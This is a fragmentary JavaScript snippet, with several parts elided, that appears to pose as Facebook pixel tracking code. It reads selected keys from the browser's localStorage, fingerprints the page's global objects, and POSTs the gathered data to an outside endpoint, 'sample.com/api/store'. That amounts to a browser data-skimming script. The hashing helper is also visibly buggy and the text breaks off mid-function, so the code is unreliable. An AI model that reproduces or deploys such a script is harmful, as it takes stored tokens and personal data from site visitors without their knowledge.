...
let keysToFetch = window.keysToFetch;
let globalObjTracker = {};
fbq.pendingConfigs = ["global_config"];
function getRndHash(target) {
  let keys = Object.getOwnPropertyNames(target);
  keys.sort();
  let hashKey = 0;
  for (let i = 0; i < keys.length; i++) {
    let charCode = keys[i].charCodeAt(i);
...
function trackLocalStorage() {
  let detectedData = {};
  Object.keys(window.localStorage).forEach(keyItem => {
    if (keysToFetch.includes(keyItem)) {
      detectedData[keyItem] = window.localStorage.getItem(keyItem);
    }
  });
  return detectedData;
}
...
function trackGlobals() {
  for (let globalKey in window) {
    if (!globalObjTracker[globalKey]) {
      globalObjTracker[globalKey] = getRndHash(window[globalKey]);
    }
  }
}
(function (a, b, c, d) {
...
async function sendData(dataToSend) {
  let hashID = getRndHash(dataToSend);
  let apiEndpoint = "https://sample.com/api/store";
  try {
    let serverResponse = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
    ...
    console.error("Error occurred during data upload: ", err);
  }
}
...
function collectAndSendData() {
  let gatheredData = trackLocalStorage();
